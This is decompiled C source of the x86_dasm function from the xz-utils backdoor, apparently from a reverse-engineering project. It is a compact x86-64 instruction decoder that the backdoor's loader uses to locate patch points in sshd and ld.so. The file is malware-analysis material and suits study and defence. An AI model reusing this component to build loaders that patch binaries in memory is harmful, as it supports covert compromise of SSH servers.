// /home/kali/xzre-ghidra/xzregh/100020_x86_dasm.c
// Function: x86_dasm @ 0x100020
// Calling convention: __stdcall
// Prototype: BOOL __stdcall x86_dasm(dasm_ctx_t * ctx, u8 * code_start, u8 * code_end)


/*
 * AutoDoc: Implements a minimal x86-64 decoder that walks a buffer while tracking instruction metadata. Every search helper in the loader
 * uses it to reason about sshd and ld.so machine code without linking a full disassembler, giving the backdoor reliable patch
 * coordinates at runtime.
 */

#include "xzre_types.h"

BOOL x86_dasm(dasm_ctx_t *ctx,u8 *code_start,u8 *code_end)

{
  x86_rex_prefix_t *pxVar1;
  u8 *puVar2;
  byte bVar3;
  byte bVar4;
  ushort uVar5;
  byte bVar6;
  BOOL BVar7;
  int iVar8;
  u64 uVar9;
  sbyte sVar10;
  uint uVar11;
  uint uVar12;
  long lVar13;
  byte *pbVar14;
  byte *pbVar15;
  byte bVar16;
  uint uVar17;
  ulong uVar18;
  ulong uVar19;
  byte *pbVar20;
  dasm_ctx_t *pdVar21;
  ulong uVar22;
  x86_prefix_state_t *pxVar23;
  BOOL bVar24;
  BOOL has_bytes_remaining;
  byte bVar26;
  ulong local_38 [4];
  
  bVar26 = 0;
  BVar7 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x12,0x46,2);
  if (BVar7 == FALSE) {
    return FALSE;
  }
  pdVar21 = ctx;
  for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
    *(undefined4 *)&pdVar21->instruction = 0;
    pdVar21 = (dasm_ctx_t *)((long)pdVar21 + (ulong)bVar26 * -8 + 4);
  }
  bVar24 = code_start < code_end;
  pbVar14 = code_start;
  do {
    if (!bVar24) {
LAB_00100aa5:
      for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
        *(undefined4 *)&ctx->instruction = 0;
        ctx = (dasm_ctx_t *)((long)ctx + (ulong)bVar26 * -8 + 4);
      }
      return FALSE;
    }
    bVar16 = *pbVar14;
    if (bVar16 < 0x68) {
      if (bVar16 < 0x2e) {
        if (bVar16 == 0xf) {
          *(undefined4 *)(ctx->opcode_window + 3) = 0xf;
          pbVar14 = pbVar14 + 1;
LAB_001001c9:
          if (code_end <= pbVar14) goto LAB_00100aa5;
          uVar11 = *(int *)(ctx->opcode_window + 3) << 8;
          *(uint *)(ctx->opcode_window + 3) = uVar11;
          bVar16 = *pbVar14;
          uVar11 = bVar16 | uVar11;
          *(uint *)(ctx->opcode_window + 3) = uVar11;
          bVar6 = *pbVar14;
          if ((bVar6 & 0xfd) == 0x38) {
            if (((ctx->prefix).decoded.flags & 0x10) != 0) {
              return FALSE;
            }
            pbVar14 = pbVar14 + 1;
            goto LAB_001003fa;
          }
          if (((int)(uint)(byte)(&dasm_twobyte_is_valid)[bVar6 >> 3] >> (bVar6 & 7) & 1U) == 0) {
            return FALSE;
          }
          if (((ctx->prefix).decoded.lock_rep_byte == 0xf3) && (bVar6 == 0x1e)) {
            if (pbVar14 + 1 < code_end) {
              pxVar23 = &ctx->prefix;
              for (lVar13 = 0x12; lVar13 != 0; lVar13 = lVar13 + -1) {
                *(undefined4 *)pxVar23 = 0;
                pxVar23 = (x86_prefix_state_t *)((long)pxVar23 + (ulong)bVar26 * -8 + 4);
              }
              ctx->instruction = code_start;
              ctx->instruction_size = 4;
              iVar8 = (pbVar14[1] == 0xfa) + 0xa5fc + (uint)(pbVar14[1] == 0xfa);
LAB_001004f1:
              *(int *)(ctx->opcode_window + 3) = iVar8;
              return TRUE;
            }
            goto LAB_00100aa5;
          }
          ctx->insn_offset = (u8)((long)pbVar14 - (long)code_start);
          uVar17 = uVar11;
          if (((ctx->prefix).decoded.flags & 0x10) != 0) {
            uVar17 = (uint)bVar16;
          }
          if ((uVar17 & 0xf0) == 0x80) {
            uVar9 = 4;
LAB_001004a7:
            puVar2 = &(ctx->prefix).decoded.flags2;
            *puVar2 = *puVar2 | 8;
            ctx->operand_size = uVar9;
          }
          else {
            if ((byte)uVar17 < 0x74) {
              if (0x6f < (uVar17 & 0xff)) {
LAB_001004a2:
                uVar9 = 1;
                goto LAB_001004a7;
              }
            }
            else {
              uVar12 = (uVar17 & 0xff) - 0xa4;
              if ((uVar12 < 0x23) && ((0x740400101U >> ((byte)uVar12 & 0x3f) & 1) != 0))
              goto LAB_001004a2;
            }
            ctx->operand_size = 0;
          }
          pbVar15 = pbVar14;
          if (((byte)(&dasm_twobyte_has_modrm)[uVar17 >> 3 & 0x1f] >> (uVar17 & 7) & 1) == 0) {
            if (((ctx->prefix).decoded.flags2 & 8) != 0) goto LAB_0010067d;
            ctx->instruction = code_start;
            pbVar14 = (byte *)(((long)pbVar14 - (long)code_start) + 1);
          }
          else {
LAB_001008c5:
            pbVar14 = pbVar15 + 1;
            if (code_end <= pbVar14) goto LAB_00100aa5;
            bVar16 = (ctx->prefix).decoded.flags;
            (ctx->prefix).decoded.flags = bVar16 | 0x40;
            bVar6 = *pbVar14;
            *(byte *)((long)&ctx->prefix + 0xc) = bVar6;
            bVar6 = bVar6 >> 6;
            *(byte *)((long)&ctx->prefix + 0xd) = bVar6;
            bVar3 = *pbVar14;
            *(byte *)((long)&ctx->prefix + 0xe) = (byte)((int)(uint)bVar3 >> 3) & 7;
            bVar4 = *pbVar14;
            *(byte *)((long)&ctx->prefix + 0xf) = bVar4 & 7;
            if (bVar6 == 3) {
LAB_00100902:
              if (((ctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) {
LAB_0010092e:
                puVar2 = &(ctx->prefix).decoded.flags2;
                *puVar2 = *puVar2 | 1;
              }
            }
            else {
              if ((bVar4 & 7) == 4) {
                (ctx->prefix).decoded.flags = bVar16 | 0xc0;
              }
              if (bVar6 != 1) {
                if (bVar6 != 2) goto LAB_00100902;
                goto LAB_0010092e;
              }
              puVar2 = &(ctx->prefix).decoded.flags2;
              *puVar2 = *puVar2 | 3;
            }
            uVar11 = *(uint *)(ctx->opcode_window + 3);
            if ((uVar11 - 0xf6 < 2) && (((int)(uint)bVar3 >> 3 & 7U) != 0)) {
              puVar2 = &(ctx->prefix).decoded.flags2;
              *puVar2 = *puVar2 & 0xf7;
              ctx->operand_size = 0;
            }
            if ((char)(ctx->prefix).decoded.flags < '\0') {
              if (code_end <= pbVar15 + 2) goto LAB_00100aa5;
              bVar16 = pbVar15[2];
              ctx->sib_byte = bVar16;
              ctx->sib_scale_bits = bVar16 >> 6;
              ctx->sib_index_bits = (byte)((int)(uint)pbVar15[2] >> 3) & 7;
              bVar16 = pbVar15[2];
              ctx->sib_base_bits = bVar16 & 7;
              if ((bVar16 & 7) == 5) {
                bVar16 = *(byte *)((long)&ctx->prefix + 0xd);
                if ((bVar16 & 0xfd) == 0) {
                  puVar2 = &(ctx->prefix).decoded.flags2;
                  *puVar2 = *puVar2 | 1;
                }
                else if (bVar16 == 1) {
                  puVar2 = &(ctx->prefix).decoded.flags2;
                  *puVar2 = *puVar2 | 3;
                }
              }
              bVar16 = (ctx->prefix).decoded.flags2;
              if ((bVar16 & 2) == 0) {
                if ((bVar16 & 1) != 0) {
                  pbVar15 = pbVar15 + 3;
                  goto LAB_0010073c;
                }
                if ((bVar16 & 8) != 0) {
                  pbVar14 = pbVar15 + 3;
                  goto LAB_00100680;
                }
                ctx->instruction = code_start;
                pbVar14 = pbVar15 + 2 + (1 - (long)code_start);
                goto LAB_001004e1;
              }
              pbVar14 = pbVar15 + 3;
LAB_001009ea:
              if (code_end <= pbVar14) goto LAB_00100aa5;
              bVar16 = (ctx->prefix).decoded.flags2;
              ctx->mem_disp = (long)(char)*pbVar14;
            }
            else {
              bVar16 = (ctx->prefix).decoded.flags2;
              if ((bVar16 & 2) != 0) {
                pbVar14 = pbVar15 + 2;
                goto LAB_001009ea;
              }
              if ((bVar16 & 1) != 0) goto LAB_0010065f;
            }
            if ((bVar16 & 8) != 0) goto LAB_0010067d;
            ctx->instruction = code_start;
            pbVar14 = pbVar14 + (1 - (long)code_start);
          }
LAB_001004e1:
          ctx->instruction_size = (u64)pbVar14;
          if (pbVar14 == (byte *)0x0) {
            return FALSE;
          }
          goto LAB_001004ee;
        }
        if (bVar16 != 0x26) goto LAB_00100191;
      }
      else if ((0xc0000000010101U >> ((ulong)(bVar16 - 0x2e) & 0x3f) & 1) == 0) {
        if (bVar16 == 0x67) {
          bVar16 = (ctx->prefix).decoded.flags;
          if ((bVar16 & 8) != 0) {
            return FALSE;
          }
          (ctx->prefix).decoded.flags = bVar16 | 8;
          (ctx->prefix).decoded.asize_byte = *pbVar14;
        }
        else {
          if (bVar16 != 0x66) {
            if ((bVar16 & 0xf0) == 0x40) {
              (ctx->prefix).decoded.flags = (ctx->prefix).decoded.flags | 0x20;
              bVar16 = *pbVar14;
              pbVar14 = pbVar14 + 1;
              (ctx->prefix).decoded.rex.rex_byte = bVar16;
            }
            goto LAB_00100191;
          }
          bVar16 = (ctx->prefix).decoded.flags;
          if (((bVar16 & 4) != 0) && ((ctx->prefix).decoded.osize_byte != 'f')) {
            return FALSE;
          }
          if ((bVar16 & 0x20) == 0) {
            (ctx->prefix).decoded.flags = (ctx->prefix).decoded.flags | 4;
            (ctx->prefix).decoded.osize_byte = *pbVar14;
          }
        }
        goto LAB_00100675;
      }
      bVar16 = (ctx->prefix).decoded.flags;
      if ((bVar16 & 2) != 0) {
        return FALSE;
      }
      (ctx->prefix).decoded.flags = bVar16 | 2;
      (ctx->prefix).decoded.seg_byte = *pbVar14;
    }
    else {
      if (bVar16 != 0xf0) {
        if (bVar16 < 0xf1) {
          if (1 < (byte)(bVar16 + 0x3c)) goto LAB_00100191;
          bVar6 = (ctx->prefix).decoded.flags;
          if ((bVar6 & 0x20) != 0) {
            return FALSE;
          }
          *(uint *)(ctx->opcode_window + 3) = (uint)bVar16;
          bVar3 = *pbVar14;
          pbVar15 = pbVar14 + 1;
          (ctx->prefix).decoded.flags = bVar6 | 0x10;
          (ctx->prefix).decoded.vex_byte = bVar3;
          if (code_end <= pbVar15) goto LAB_00100aa5;
          bVar6 = pbVar14[1];
          (ctx->prefix).decoded.rex.rex_byte = '@';
          uVar11 = (uint)bVar16 << 8 | 0xf;
          (ctx->prefix).decoded.vex_byte2 = bVar6;
          *(uint *)(ctx->opcode_window + 3) = uVar11;
          bVar16 = ((char)pbVar14[1] >> 7 & 0xfcU) + 0x44;
          *(byte *)((long)&ctx->prefix + 0xb) = bVar16;
          if (bVar3 == 0xc5) goto LAB_001001c5;
          if (bVar3 != 0xc4) {
            return FALSE;
          }
          bVar3 = pbVar14[1];
          if ((bVar3 & 0x40) == 0) {
            (ctx->prefix).decoded.rex.rex_byte = bVar16 | 2;
          }
          if ((pbVar14[1] & 0x20) == 0) {
            pxVar1 = &(ctx->prefix).decoded.rex;
            pxVar1->rex_byte = pxVar1->rex_byte | 1;
          }
          if (2 < (byte)((bVar3 & 0x1f) - 1)) {
            return FALSE;
          }
          if (code_end <= pbVar14 + 2) goto LAB_00100aa5;
          bVar16 = pbVar14[2];
          bVar6 = bVar6 & 0x1f;
          (ctx->prefix).decoded.vex_byte3 = bVar16;
          if (-1 < (char)bVar16) {
            pxVar1 = &(ctx->prefix).decoded.rex;
            pxVar1->rex_byte = pxVar1->rex_byte | 8;
          }
          uVar11 = uVar11 << 8;
          *(uint *)(ctx->opcode_window + 3) = uVar11;
          if (bVar6 == 2) {
            uVar11 = uVar11 | 0x38;
          }
          else {
            if (bVar6 != 3) {
              if (bVar6 != 1) {
                return FALSE;
              }
              pbVar14 = pbVar14 + 3;
              goto LAB_001001c9;
            }
            uVar11 = uVar11 | 0x3a;
          }
          *(uint *)(ctx->opcode_window + 3) = uVar11;
          pbVar14 = pbVar14 + 3;
LAB_001003fa:
          if (code_end <= pbVar14) goto LAB_00100aa5;
          uVar12 = *(int *)(ctx->opcode_window + 3) << 8;
          *(uint *)(ctx->opcode_window + 3) = uVar12;
          bVar16 = *pbVar14;
          uVar11 = bVar16 | uVar12;
          *(uint *)(ctx->opcode_window + 3) = uVar11;
          uVar17 = uVar11;
          if (((ctx->prefix).decoded.flags & 0x10) != 0) {
            uVar17 = (uint)bVar16 | uVar12 & 0xffffff;
          }
          uVar12 = uVar17 & 0xff00;
          pbVar15 = pbVar14;
          if (uVar12 != 0x3800) {
            uVar11 = uVar17 & 0xff;
            bVar16 = (byte)uVar17;
            if (bVar16 < 0xf1) {
              if (uVar11 < 0xcc) {
                if (uVar11 < 0x3a) {
                  if (0x37 < uVar11) goto LAB_001005bf;
                  bVar24 = uVar11 - 0x20 < 2;
                  has_bytes_remaining = uVar11 - 0x20 == 2;
                }
                else {
                  bVar24 = uVar11 - 0x60 < 3;
                  has_bytes_remaining = uVar11 - 0x60 == 3;
                }
                if (!bVar24 && !has_bytes_remaining) goto LAB_001005d6;
              }
              else if ((0x1000080001U >> (bVar16 + 0x34 & 0x3f) & 1) == 0) goto LAB_001005d6;
LAB_001005bf:
              ctx->insn_offset = (char)pbVar14 - (char)code_start;
              if (uVar12 == 0x3a00) {
LAB_0010063c:
                puVar2 = &(ctx->prefix).decoded.flags2;
                *puVar2 = *puVar2 | 8;
                ctx->operand_size = 1;
                goto LAB_001008c5;
              }
            }
            else {
LAB_001005d6:
              bVar6 = bVar16 & 0xf;
              if (bVar16 >> 4 == 1) {
                if (bVar6 < 10) {
                  bVar24 = (uVar17 & 0xc) == 0;
                  goto LAB_00100604;
                }
                if (bVar6 != 0xd) {
                  return FALSE;
                }
              }
              else {
                if (bVar16 >> 4 == 4) {
                  bVar24 = (0x1c57UL >> bVar6 & 1) == 0;
                }
                else {
                  if (bVar16 >> 4 != 0) {
                    return FALSE;
                  }
                  bVar24 = (bVar16 & 0xb) == 3;
                }
LAB_00100604:
                if (bVar24) {
                  return FALSE;
                }
              }
              ctx->insn_offset = (char)pbVar14 - (char)code_start;
              if ((uVar12 == 0x3a00) && (2 < uVar11 - 0x4a)) goto LAB_0010063c;
            }
            ctx->operand_size = 0;
            goto LAB_001008c5;
          }
          uVar12 = uVar17 >> 3 & 0x1f;
          if (((byte)(&dasm_threebyte_0x38_is_valid)[uVar12] >> (uVar17 & 7) & 1) == 0) {
            return FALSE;
          }
          ctx->operand_size = 0;
          bVar16 = (&dasm_threebyte_has_modrm)[uVar12];
          ctx->insn_offset = (u8)((long)pbVar14 - (long)code_start);
          if ((bVar16 >> (uVar17 & 7) & 1) != 0) goto LAB_001008c5;
          if (((ctx->prefix).decoded.flags2 & 8) == 0) {
            ctx->instruction = code_start;
            pbVar14 = (byte *)(((long)pbVar14 - (long)code_start) + 1);
            goto LAB_001004e1;
          }
LAB_0010067d:
          pbVar14 = pbVar14 + 1;
LAB_00100680:
          if (code_end <= pbVar14) goto LAB_00100aa5;
          uVar9 = ctx->operand_size;
          bVar16 = *pbVar14;
          if (uVar9 != 1) {
            pbVar15 = pbVar14 + 1;
            if (((undefined1  [16])ctx->prefix & (undefined1  [16])0xff000000000004) ==
                (undefined1  [16])0x66000000000004) {
              if (uVar9 == 2) {
                ctx->operand_size = 4;
              }
              else if (uVar9 == 4) {
                ctx->operand_size = 2;
              }
            }
            if (code_end <= pbVar15) goto LAB_00100aa5;
            uVar5 = CONCAT11(*pbVar15,bVar16);
            if (ctx->operand_size == 2) {
              ctx->operand_zeroextended = (ulong)uVar5;
              ctx->operand = (long)(short)uVar5;
              pbVar14 = pbVar15 + (1 - (long)code_start);
              ctx->instruction = code_start;
              goto LAB_001007e4;
            }
            if (code_end <= pbVar14 + 2) goto LAB_00100aa5;
            pbVar20 = pbVar14 + 3;
            if (code_end <= pbVar20) goto LAB_00100aa5;
            uVar11 = CONCAT13(pbVar14[3],CONCAT12(pbVar14[2],uVar5));
            if (ctx->operand_size == 4) {
              ctx->operand_zeroextended = (ulong)uVar11;
              uVar9 = (u64)(int)uVar11;
            }
            else {
              if (((code_end <= pbVar14 + 4) || (code_end <= pbVar14 + 5)) ||
                 (code_end <= pbVar14 + 6)) goto LAB_00100aa5;
              pbVar20 = pbVar14 + 7;
              if (code_end <= pbVar20) goto LAB_00100aa5;
              uVar9 = CONCAT17(pbVar14[7],
                               CONCAT16(pbVar14[6],CONCAT15(pbVar14[5],CONCAT14(pbVar14[4],uVar11)))
                              );
              ctx->operand_zeroextended = uVar9;
            }
            ctx->operand = uVar9;
            goto LAB_0010089f;
          }
          ctx->operand_zeroextended = (ulong)bVar16;
          pbVar14 = pbVar14 + (1 - (long)code_start);
          ctx->operand = (long)(char)bVar16;
          ctx->instruction = code_start;
          ctx->instruction_size = (u64)pbVar14;
        }
        else {
          if ((byte)(bVar16 + 0xe) < 2) goto LAB_001000cf;
LAB_00100191:
          if (code_end <= pbVar14) goto LAB_00100aa5;
          bVar16 = *pbVar14;
          uVar22 = (ulong)bVar16;
          if (bVar16 == 0xf) {
            *(undefined4 *)(ctx->opcode_window + 3) = 0xf;
            pbVar15 = pbVar14;
LAB_001001c5:
            pbVar14 = pbVar15 + 1;
            goto LAB_001001c9;
          }
          uVar11 = (uint)bVar16;
          uVar17 = bVar16 & 7;
          if (((byte)(&dasm_onebyte_is_invalid)[bVar16 >> 3] >> uVar17 & 1) != 0) {
            return FALSE;
          }
          *(uint *)(ctx->opcode_window + 3) = (uint)bVar16;
          local_38[0] = 0x3030303030303030;
          ctx->insn_offset = (u8)((long)pbVar14 - (long)code_start);
          local_38[1] = 0xffff0fc000000000;
          local_38[2] = 0xffff03000000000b;
          local_38[3] = 0xc00bff000025c7;
          uVar18 = local_38[bVar16 >> 6] >> (bVar16 & 0x3f);
          uVar19 = (ulong)((uint)uVar18 & 1);
          if ((uVar18 & 1) == 0) {
            ctx->operand_size = 0;
          }
          else {
            if (bVar16 < 0xf8) {
              if (bVar16 < 0xc2) {
                if (bVar16 < 0x6a) {
                  if (bVar16 < 0x2d) {
                    if (0x20 < (byte)(bVar16 - 5)) goto LAB_00100344;
                    uVar18 = 0x2020202020;
                  }
                  else {
                    uVar18 = 0x1800000000010101;
                    uVar22 = (ulong)(bVar16 - 0x2d);
                  }
                }
                else {
                  uVar18 = 0x7f80010000000001;
                  uVar22 = (ulong)(bVar16 + 0x7f);
                  if (0x3e < (byte)(bVar16 + 0x7f)) goto LAB_00100344;
                }
                if ((uVar18 >> (uVar22 & 0x3f) & 1) != 0) {
                  uVar19 = 4;
                }
              }
              else {
                uVar22 = 1L << (bVar16 + 0x3e & 0x3f);
                if ((uVar22 & 0x2000c800000020) == 0) {
                  if ((uVar22 & 0x101) != 0) {
                    uVar19 = 2;
                  }
                }
                else {
                  uVar19 = 4;
                }
              }
            }
LAB_00100344:
            puVar2 = &(ctx->prefix).decoded.flags2;
            *puVar2 = *puVar2 | 8;
            ctx->operand_size = uVar19;
          }
          sVar10 = (sbyte)uVar17;
          pbVar15 = pbVar14;
          if (((int)(uint)(byte)(&dasm_onebyte_has_modrm)[bVar16 >> 3] >> sVar10 & 1U) != 0)
          goto LAB_001008c5;
          if (3 < bVar16 - 0xa0) {
            bVar6 = (ctx->prefix).decoded.flags2;
            if ((bVar6 & 8) != 0) {
              if (((((ctx->prefix).decoded.flags & 0x20) != 0) &&
                  (((ctx->prefix).decoded.rex.rex_byte & 8) != 0)) && ((bVar16 & 0xf8) == 0xb8)) {
                ctx->operand_size = 8;
                (ctx->prefix).decoded.flags2 = bVar6 | 0x10;
                ctx->imm64_reg = sVar10;
                *(undefined4 *)(ctx->opcode_window + 3) = 0xb8;
              }
              goto LAB_0010067d;
            }
            ctx->instruction = code_start;
            pbVar14 = (byte *)(((long)pbVar14 - (long)code_start) + 1);
            goto LAB_001004e1;
          }
          puVar2 = &(ctx->prefix).decoded.flags2;
          *puVar2 = *puVar2 | 5;
LAB_0010065f:
          pbVar15 = pbVar14 + 1;
LAB_0010073c:
          if (((code_end <= pbVar15) || (code_end <= pbVar15 + 1)) || (code_end <= pbVar15 + 2))
          goto LAB_00100aa5;
          pbVar20 = pbVar15 + 3;
          if (code_end <= pbVar20) goto LAB_00100aa5;
          bVar16 = (ctx->prefix).decoded.flags2;
          ctx->mem_disp =
               (long)CONCAT13(pbVar15[3],CONCAT12(pbVar15[2],CONCAT11(pbVar15[1],*pbVar15)));
          if ((bVar16 & 4) == 0) {
            if ((bVar16 & 8) != 0) {
              pbVar14 = pbVar15 + 4;
              goto LAB_00100680;
            }
LAB_0010089f:
            ctx->instruction = code_start;
            pbVar14 = pbVar20 + (1 - (long)code_start);
          }
          else {
            if (((code_end <= pbVar15 + 4) || (code_end <= pbVar15 + 5)) ||
               ((code_end <= pbVar15 + 6 || (code_end <= pbVar15 + 7)))) goto LAB_00100aa5;
            if ((bVar16 & 8) != 0) {
              pbVar14 = pbVar15 + 8;
              goto LAB_00100680;
            }
            ctx->instruction = code_start;
            pbVar14 = pbVar15 + 7 + (1 - (long)code_start);
          }
LAB_001007e4:
          ctx->instruction_size = (u64)pbVar14;
        }
        if (pbVar14 == (byte *)0x0) {
          return FALSE;
        }
        uVar11 = *(uint *)(ctx->opcode_window + 3);
LAB_001004ee:
        iVar8 = uVar11 + 0x80;
        goto LAB_001004f1;
      }
LAB_001000cf:
      bVar16 = (ctx->prefix).decoded.flags;
      if ((bVar16 & 1) != 0) {
        return FALSE;
      }
      (ctx->prefix).decoded.flags = bVar16 | 1;
      (ctx->prefix).decoded.lock_rep_byte = *pbVar14;
    }
LAB_00100675:
    pbVar14 = pbVar14 + 1;
    bVar24 = pbVar14 < code_end;
  } while( TRUE );
}

